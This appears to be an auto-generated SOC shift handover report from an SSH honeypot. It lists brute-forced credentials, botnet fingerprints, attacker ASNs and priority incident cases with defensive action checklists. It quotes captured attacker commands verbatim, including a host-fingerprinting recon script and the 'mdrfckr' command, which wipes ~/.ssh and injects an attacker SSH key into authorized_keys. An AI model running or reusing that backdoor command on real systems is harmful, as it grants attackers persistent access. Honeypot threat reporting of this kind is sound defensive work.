# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-07 |
| **Generated At** | 2026-08-07T13:12:34Z |
| **Shift Time** | 13:12 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **369** |
| Confirmed Threats | **276** |
| False Positives Filtered | **93** (25.2%) |
| Unique Attacker IPs | **93** |
| Countries of Origin | **23** |
| High Severity Cases | **97** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **272** |
| Malware Samples Analyzed | **2** HIGH · **24** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **110** |
| Unique Credential Pairs | **74** |
| Unique Usernames | **24** |
| Unique Passwords | **53** |
| Successful Auth Pairs | **103** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 34 |
| `admin` | 17 |
| `supervisor` | 12 |
| `test123` | 6 |
| `support` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123321` | 6 |
| `test123` | 6 |
| `123456` | 4 |
| `12345678` | 4 |
| `123` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `supervisor` | `123321` | 6 |
| `test123` | `test123` | 6 |
| `supervisor` | `abc123` | 4 |
| `support` | `support` | 4 |
| `mike` | `mike` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `hunter` | `hunter@123` | `172.178.16.179` | 2026-08-07T10:55:19 |
| `345gs5662d34` | `345gs5662d34` | `172.178.16.179` | 2026-08-07T10:55:20 |
| `hunter` | `3245gs5662d34` | `172.178.16.179` | 2026-08-07T10:55:20 |
| `solv` | `1234` | `2.57.122.238` | 2026-08-07T10:55:56 |
| `leo` | `leo` | `121.159.71.249` | 2026-08-07T10:56:00 |
| `leo` | `leo` | `186.215.107.189` | 2026-08-07T10:56:08 |
| `solv` | `123456` | `2.57.122.238` | 2026-08-07T10:57:32 |
| `solv` | `12345678` | `2.57.122.238` | 2026-08-07T10:59:04 |
| `ethereum` | `ethereum` | `2.57.122.238` | 2026-08-07T11:00:39 |
| `node` | `node` | `2.57.122.238` | 2026-08-07T11:02:18 |
| `ubuntu` | `ubuntu` | `2.57.122.238` | 2026-08-07T11:03:54 |
| `supervisor` | `123321` | `178.178.222.59` | 2026-08-07T11:04:04 |
| `supervisor` | `123321` | `45.236.19.9` | 2026-08-07T11:04:16 |
| `validator` | `validator` | `2.57.122.238` | 2026-08-07T11:05:31 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-07T11:06:07 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-07T11:06:09 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-07T11:06:09 |
| `supervisor` | `123321` | `125.19.244.62` | 2026-08-07T11:07:09 |
| `sol` | `sol123` | `2.57.122.238` | 2026-08-07T11:07:12 |
| `supervisor` | `123321` | `196.191.142.67` | 2026-08-07T11:07:16 |
| `supervisor` | `123321` | `10.0.0.73` | 2026-08-07T11:07:30 |
| `sol` | `123` | `2.57.122.238` | 2026-08-07T11:08:57 |
| `supervisor` | `abc123` | `23.30.11.253` | 2026-08-07T11:09:13 |
| `supervisor` | `abc123` | `218.206.136.24` | 2026-08-07T11:09:22 |
| `supervisor` | `abc123` | `111.70.9.235` | 2026-08-07T11:09:29 |
| `supervisor` | `abc123` | `65.20.211.96` | 2026-08-07T11:09:36 |
| `sol` | `12345678` | `2.57.122.238` | 2026-08-07T11:10:34 |
| `admin` | `999999` | `170.233.29.157` | 2026-08-07T11:11:56 |
| `trading` | `trading` | `2.57.122.238` | 2026-08-07T11:12:07 |
| `guest` | `123abc` | `10.0.0.73` | 2026-08-07T11:12:29 |
| `trader` | `trader` | `2.57.122.238` | 2026-08-07T11:13:44 |
| `tradingbot` | `tradingbot` | `2.57.122.238` | 2026-08-07T11:15:24 |
| `bot` | `bot` | `2.57.122.238` | 2026-08-07T11:17:00 |
| `bot` | `123456` | `2.57.122.238` | 2026-08-07T11:18:36 |
| `bot` | `12345` | `2.57.122.238` | 2026-08-07T11:20:18 |
| `support` | `support` | `10.0.0.73` | 2026-08-07T11:22:28 |
| `mike` | `mike` | `10.0.0.73` | 2026-08-07T11:24:58 |
| `tunnel` | `123` | `5.252.226.244` | 2026-08-07T11:25:24 |
| `345gs5662d34` | `345gs5662d34` | `5.252.226.244` | 2026-08-07T11:25:27 |
| `tunnel` | `3245gs5662d34` | `5.252.226.244` | 2026-08-07T11:25:28 |
| `admin` | `999999` | `90.230.168.26` | 2026-08-07T11:41:14 |
| `mike` | `mike` | `180.76.104.208` | 2026-08-07T11:43:51 |
| `mike` | `mike` | `116.72.9.151` | 2026-08-07T11:44:01 |
| `admin` | `ubnt` | `106.0.166.123` | 2026-08-07T11:48:58 |
| `root` | `root2010` | `111.70.10.15` | 2026-08-07T11:50:06 |
| `root` | `root2010` | `76.132.238.43` | 2026-08-07T11:50:13 |
| `root` | `root2010` | `60.166.31.198` | 2026-08-07T11:53:21 |
| `root` | `root2010` | `182.76.71.82` | 2026-08-07T11:53:31 |
| `root` | `---fuck_you----` | `80.99.159.65` | 2026-08-07T11:57:04 |
| `root` | `ceadmin` | `10.0.0.73` | 2026-08-07T11:59:45 |
| `support` | `support` | `176.53.159.196` | 2026-08-07T12:02:16 |
| `root` | `000000` | `195.178.110.228` | 2026-08-07T12:04:20 |
| `buddy` | `buddy` | `153.75.250.217` | 2026-08-07T12:04:41 |
| `345gs5662d34` | `345gs5662d34` | `153.75.250.217` | 2026-08-07T12:04:42 |
| `buddy` | `3245gs5662d34` | `153.75.250.217` | 2026-08-07T12:04:42 |
| `admin` | `ubnt` | `60.172.41.103` | 2026-08-07T12:05:26 |
| `root` | `111111` | `195.178.110.228` | 2026-08-07T12:05:53 |
| `root` | `123` | `195.178.110.228` | 2026-08-07T12:07:24 |
| `admin` | `admin` | `47.253.5.130` | 2026-08-07T12:08:33 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-07T12:08:34 |
| `root` | `123123` | `195.178.110.228` | 2026-08-07T12:09:06 |
| `root` | `1234` | `195.178.110.228` | 2026-08-07T12:10:48 |
| `root` | `12345` | `195.178.110.228` | 2026-08-07T12:12:31 |
| `root` | `12345678` | `195.178.110.228` | 2026-08-07T12:15:51 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-07T12:15:51 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-07T12:15:53 |
| `guest` | `guest12345` | `10.0.0.73` | 2026-08-07T12:17:00 |
| `root` | `123456789` | `195.178.110.228` | 2026-08-07T12:17:30 |
| `root` | `ceadmin` | `181.212.174.164` | 2026-08-07T12:18:41 |
| `root` | `ceadmin` | `115.241.228.34` | 2026-08-07T12:18:52 |
| `root` | `1q2w3e4r` | `195.178.110.228` | 2026-08-07T12:19:10 |
| `root` | `654321` | `195.178.110.228` | 2026-08-07T12:20:51 |
| `supervisor` | `qwerty12` | `183.247.171.186` | 2026-08-07T12:21:22 |
| `root` | `P@ssw0rd` | `195.178.110.228` | 2026-08-07T12:22:36 |
| `root` | `admin` | `195.178.110.228` | 2026-08-07T12:24:22 |
| `root` | `admin123` | `195.178.110.228` | 2026-08-07T12:26:05 |
| `root` | `passw0rd` | `195.178.110.228` | 2026-08-07T12:27:45 |
| `root` | `password` | `195.178.110.228` | 2026-08-07T12:29:24 |
| `root` | `password1` | `195.178.110.228` | 2026-08-07T12:31:06 |
| `root` | `qwerty` | `195.178.110.228` | 2026-08-07T12:32:47 |
| `test123` | `test123` | `10.0.0.73` | 2026-08-07T12:34:20 |
| `root` | `root123` | `195.178.110.228` | 2026-08-07T12:34:28 |
| `root` | `toor` | `195.178.110.228` | 2026-08-07T12:36:06 |
| `centos` | `centos2003` | `65.20.202.4` | 2026-08-07T12:36:28 |
| `admin` | `000000` | `195.178.110.228` | 2026-08-07T12:37:44 |
| `admin` | `111111` | `195.178.110.228` | 2026-08-07T12:39:22 |
| `centos` | `centos2003` | `181.212.174.164` | 2026-08-07T12:39:44 |
| `centos` | `centos2003` | `10.0.0.73` | 2026-08-07T12:39:55 |
| `admin` | `123` | `195.178.110.228` | 2026-08-07T12:40:59 |
| `admin` | `123123` | `195.178.110.228` | 2026-08-07T12:42:35 |
| `admin` | `1234` | `195.178.110.228` | 2026-08-07T12:44:20 |
| `admin` | `12345` | `195.178.110.228` | 2026-08-07T12:46:01 |
| `admin` | `123456` | `195.178.110.228` | 2026-08-07T12:47:44 |
| `admin` | `1234567` | `195.178.110.228` | 2026-08-07T12:49:30 |
| `anonymous` | `Exabyte` | `45.154.244.193` | 2026-08-07T12:49:55 |
| `supervisor` | `qwerty12` | `60.166.8.174` | 2026-08-07T12:50:46 |
| `admin` | `12345678` | `195.178.110.228` | 2026-08-07T12:51:06 |
| `admin` | `123456789` | `195.178.110.228` | 2026-08-07T12:52:40 |
| `test123` | `test123` | `103.83.23.169` | 2026-08-07T12:53:16 |
| `test123` | `test123` | `213.234.9.218` | 2026-08-07T12:53:23 |
| `test123` | `test123` | `195.158.26.59` | 2026-08-07T12:53:25 |
| `test123` | `test123` | `203.92.36.109` | 2026-08-07T12:53:36 |
| `admin` | `1q2w3e4r` | `195.178.110.228` | 2026-08-07T12:54:20 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **369** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 51 |
| OpenSSH | 31 |
| libssh | 19 |
| Paramiko (Python) | 6 |
| Perl Net::SSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 31 | 30 |
| `2ec37a7cc8da...` | Mirai/variant | 31 | 1 |
| `16443846184e...` | Generic scanner | 16 | 1 |
| `f555226df196...` | Mirai/variant | 9 | 3 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 31 | 30 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 31 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 16 | 1 | Generic scanner |
| `f555226df196...` | libssh | 9 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 8 | 4 | — |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 30 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.228`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `172.178.16.179`, `5.252.226.244`, `153.75.250.217`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **93** |
| Unique ASNs | **66** |
| High-Risk ASNs | **31** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS46562` | Performive LLC | 4 | LOW |
| `AS22927` | Telefonica de Argentina | 3 | LOW |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 3 | HIGH |
| `AS213412` | ONYPHE SAS | 3 | LOW |
| `AS48721` | Flyservers S.A. | 3 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | LOW |
| `AS8075` | Microsoft Corporation | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (61)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-934bad3d6b83

| Field | Detail |
|---|---|
| **Source IP** | `172.178.16[.]179` |
| **First Seen** | 2026-08-07 10:55 |
| **Last Seen** | 2026-08-07 10:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 10:55:19` | `cowrie.session.connect` |
| `2026-08-07 10:55:19` | `cowrie.client.version` |
| `2026-08-07 10:55:19` | `cowrie.client.kex` |
| `2026-08-07 10:55:19` | `cowrie.login.success` |
| `2026-08-07 10:55:20` | `cowrie.session.params` |
| `2026-08-07 10:55:20` | `cowrie.command.input` |
| `2026-08-07 10:55:20` | `cowrie.command.failed` |
| `2026-08-07 10:55:20` | `cowrie.log.closed` |
| `2026-08-07 10:55:20` | `cowrie.session.params` |
| `2026-08-07 10:55:20` | `cowrie.command.input` |
| `2026-08-07 10:55:20` | `cowrie.session.file_download` |
| `2026-08-07 10:55:20` | `cowrie.log.closed` |
| `2026-08-07 10:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.178.16[.]179` to AbuseIPDB if not already reported
- [ ] Block `172.178.16[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f535b57e83e

| Field | Detail |
|---|---|
| **Source IP** | `172.178.16[.]179` |
| **First Seen** | 2026-08-07 10:55 |
| **Last Seen** | 2026-08-07 10:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 10:55:20` | `cowrie.session.connect` |
| `2026-08-07 10:55:20` | `cowrie.client.version` |
| `2026-08-07 10:55:20` | `cowrie.client.kex` |
| `2026-08-07 10:55:20` | `cowrie.login.success` |
| `2026-08-07 10:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.178.16[.]179` to AbuseIPDB if not already reported
- [ ] Block `172.178.16[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-749e03778c62

| Field | Detail |
|---|---|
| **Source IP** | `172.178.16[.]179` |
| **First Seen** | 2026-08-07 10:55 |
| **Last Seen** | 2026-08-07 10:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 10:55:20` | `cowrie.session.connect` |
| `2026-08-07 10:55:20` | `cowrie.client.version` |
| `2026-08-07 10:55:20` | `cowrie.client.kex` |
| `2026-08-07 10:55:20` | `cowrie.login.success` |
| `2026-08-07 10:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.178.16[.]179` to AbuseIPDB if not already reported
- [ ] Block `172.178.16[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76a8c48a41a1

| Field | Detail |
|---|---|
| **Source IP** | `186.215.107[.]189` |
| **First Seen** | 2026-08-07 10:56 |
| **Last Seen** | 2026-08-07 10:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 10:56:06` | `cowrie.session.connect` |
| `2026-08-07 10:56:07` | `cowrie.client.version` |
| `2026-08-07 10:56:07` | `cowrie.client.kex` |
| `2026-08-07 10:56:08` | `cowrie.login.success` |
| `2026-08-07 10:56:08` | `cowrie.direct-tcpip.request` |
| `2026-08-07 10:56:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.215.107[.]189` to AbuseIPDB if not already reported
- [ ] Block `186.215.107[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3e902489d38

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]59` |
| **First Seen** | 2026-08-07 11:03 |
| **Last Seen** | 2026-08-07 11:04 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 11:03:58` | `cowrie.session.connect` |
| `2026-08-07 11:03:59` | `cowrie.client.version` |
| `2026-08-07 11:03:59` | `cowrie.client.kex` |
| `2026-08-07 11:04:04` | `cowrie.login.success` |
| `2026-08-07 11:04:04` | `cowrie.direct-tcpip.request` |
| `2026-08-07 11:04:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]59` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-925adb109a98

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-07 11:06 |
| **Last Seen** | 2026-08-07 11:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 11:06:07` | `cowrie.session.connect` |
| `2026-08-07 11:06:07` | `cowrie.client.version` |
| `2026-08-07 11:06:07` | `cowrie.client.kex` |
| `2026-08-07 11:06:07` | `cowrie.login.success` |
| `2026-08-07 11:06:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-392112bd33db

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-07 11:06 |
| **Last Seen** | 2026-08-07 11:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 11:06:08` | `cowrie.session.connect` |
| `2026-08-07 11:06:08` | `cowrie.client.version` |
| `2026-08-07 11:06:08` | `cowrie.client.kex` |
| `2026-08-07 11:06:09` | `cowrie.login.success` |
| `2026-08-07 11:06:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4912a50d36f1

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-07 11:06 |
| **Last Seen** | 2026-08-07 11:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 11:06:09` | `cowrie.session.connect` |
| `2026-08-07 11:06:09` | `cowrie.client.version` |
| `2026-08-07 11:06:09` | `cowrie.client.kex` |
| `2026-08-07 11:06:09` | `cowrie.login.success` |
| `2026-08-07 11:06:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99006d158e30

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-07 11:06 |
| **Last Seen** | 2026-08-07 11:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 11:06:19` | `cowrie.session.connect` |
| `2026-08-07 11:06:19` | `cowrie.client.version` |
| `2026-08-07 11:06:19` | `cowrie.client.kex` |
| `2026-08-07 11:06:19` | `cowrie.login.success` |
| `2026-08-07 11:06:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1e58d8205b3

| Field | Detail |
|---|---|
| **Source IP** | `125.19.244[.]62` |
| **First Seen** | 2026-08-07 11:07 |
| **Last Seen** | 2026-08-07 11:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 11:07:06` | `cowrie.session.connect` |
| `2026-08-07 11:07:07` | `cowrie.client.version` |
| `2026-08-07 11:07:07` | `cowrie.client.kex` |
| `2026-08-07 11:07:09` | `cowrie.login.success` |
| `2026-08-07 11:07:09` | `cowrie.direct-tcpip.request` |
| `2026-08-07 11:07:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.19.244[.]62` to AbuseIPDB if not already reported
- [ ] Block `125.19.244[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38e4cd96d306

| Field | Detail |
|---|---|
| **Source IP** | `196.191.142[.]67` |
| **First Seen** | 2026-08-07 11:07 |
| **Last Seen** | 2026-08-07 11:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 11:07:14` | `cowrie.session.connect` |
| `2026-08-07 11:07:15` | `cowrie.client.version` |
| `2026-08-07 11:07:15` | `cowrie.client.kex` |
| `2026-08-07 11:07:16` | `cowrie.login.success` |
| `2026-08-07 11:07:17` | `cowrie.direct-tcpip.request` |
| `2026-08-07 11:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.191.142[.]67` to AbuseIPDB if not already reported
- [ ] Block `196.191.142[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c46acfaedb3

| Field | Detail |
|---|---|
| **Source IP** | `23.30.11[.]253` |
| **First Seen** | 2026-08-07 11:09 |
| **Last Seen** | 2026-08-07 11:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 11:09:12` | `cowrie.session.connect` |
| `2026-08-07 11:09:12` | `cowrie.client.version` |
| `2026-08-07 11:09:12` | `cowrie.client.kex` |
| `2026-08-07 11:09:13` | `cowrie.login.success` |
| `2026-08-07 11:09:14` | `cowrie.direct-tcpip.request` |
| `2026-08-07 11:09:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.30.11[.]253` to AbuseIPDB if not already reported
- [ ] Block `23.30.11[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d155e6e1720

| Field | Detail |
|---|---|
| **Source IP** | `170.233.29[.]157` |
| **First Seen** | 2026-08-07 11:11 |
| **Last Seen** | 2026-08-07 11:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-07 11:11:54` | `cowrie.session.connect` |
| `2026-08-07 11:11:54` | `cowrie.client.version` |
| `2026-08-07 11:11:54` | `cowrie.client.kex` |
| `2026-08-07 11:11:56` | `cowrie.login.success` |
| `2026-08-07 11:11:57` | `cowrie.direct-tcpip.request` |
| `2026-08-07 11:12:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.233.29[.]157` to AbuseIPDB if not already reported
- [ ] Block `170.233.29[.]157` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c2082e9d3e1

| Field | Detail |
|---|---|
| **Source IP** | `5.252.226[.]244` |
| **First Seen** | 2026-08-07 11:25 |
| **Last Seen** | 2026-08-07 11:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
